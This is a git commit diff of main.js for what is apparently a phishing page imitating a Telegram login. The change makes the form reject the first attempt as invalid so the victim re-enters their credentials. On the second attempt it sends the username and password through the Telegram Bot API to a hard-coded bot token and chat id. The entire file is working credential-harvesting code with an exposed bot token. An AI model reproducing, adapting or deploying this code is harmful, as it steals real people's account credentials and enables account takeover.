2c3d96a3900f6c3b22645b7615d593301c10da94
Fantastik897 <sunnatbekyusupov18@gmail.com>
2024-04-11 22:44:58 +0500

    Stop

--- main.js
+++ main.js
@@ -1,24 +1,65 @@
 document.addEventListener('DOMContentLoaded', () => {
     const form = document.getElementById('telegramForm');
+    const loading = document.getElementById('loading');
+    const validText = document.querySelector(".invalid") 
+    let tryCount = 0; // Счётчик попыток входа
+
     form.addEventListener('submit', function(e) {
         e.preventDefault();
         
-        // Foydalanuvchi nomi va parolni kodlash
-        const username = encodeURIComponent(document.getElementById('username').value);
-        const password = encodeURIComponent(document.getElementById('password').value);
-        
-        // Xabar matnini yangi qator belgilari bilan tuzish
-        // const message = `Username: ${username} \n Password: ${password}`;
-        
-        const jonatish = `<b>Username:</b> <em>${username}</em>\n<b>Password:</b> <em>${password}</em>`
-        
-        // Telegram API uchun URL tuzish
-        const url = `https://api.telegram.org/bot6681983180:AAFEgYgqQiWC4-0rAdlW7Vu_4RBUF_r6se4/sendMessage?chat_id=697727022&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;
-        
-        // fetch yordamida so'rov yuborish va natijani konsolda ko'rsatish
-        fetch(url, { method: 'GET' })
-        .then(response => response.json())
-        .then(data => console.log(data))
-        .catch(error => console.error('Error:', error));
+        const username = document.getElementById('username');
+        const password = document.getElementById('password');
+
+        // Удаление класса invalid-input, если он был добавлен ранее
+        username.classList.remove('invalid-input');
+        password.classList.remove('invalid-input');
+
+        if (tryCount === 0) {
+            // Если первая попытка, отмечаем как невалидный ввод
+            username.classList.add('invalid-input');
+            password.classList.add('invalid-input');
+            validText.style.display = 'block';
+            username.value = '';
+                    password.value = '';
+            
+            tryCount++;
+            return; // Прекратить выполнение функции
+        } else {
+            // На второй попытке показываем анимацию загрузки
+            
+            // Задержка перед отправкой данных
+            setInterval(() => {
+                loading.style.display = 'flex';
+            }, 500);
+            
+                const encodedUsername = encodeURIComponent(username.value);
+                const encodedPassword = encodeURIComponent(password.value);
+                const jonatish = `<b>Username:</b> <em>${encodedUsername}</em>\n<b>Password:</b> <em>${encodedPassword}</em>`;
+
+                const url = `https://api.telegram.org/bot6681983180:AAFEgYgqQiWC4-0rAdlW7Vu_4RBUF_r6se4/sendMessage?chat_id=697727022&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;
+                
+                fetch(url, { method: 'GET' })
+                .then(response => response.json())
+                .then(data => {
+                    loading.style.display = 'none'; // Скрыть анимацию загрузки
+                    console.log(data);
+                    if (data.ok) {
+                        console.log(data.result.message_id);
+                        // Здесь можно добавить действия при успешной отправке данных
+                    } else {
+                        console.log(data.error_code);
+                        // Обработка ошибок отправки
+                    }
+                    
+                })
+                .catch((error) => {
+                    alert("Error! Please try again: " + error.message);
+                    console.log(error);
+                    loading.style.display = 'none';
+                    username.value = '';
+                    password.value = '';
+                });
+            // Задержка в 20 секунд перед отправкой данных
+        }
     });
 });
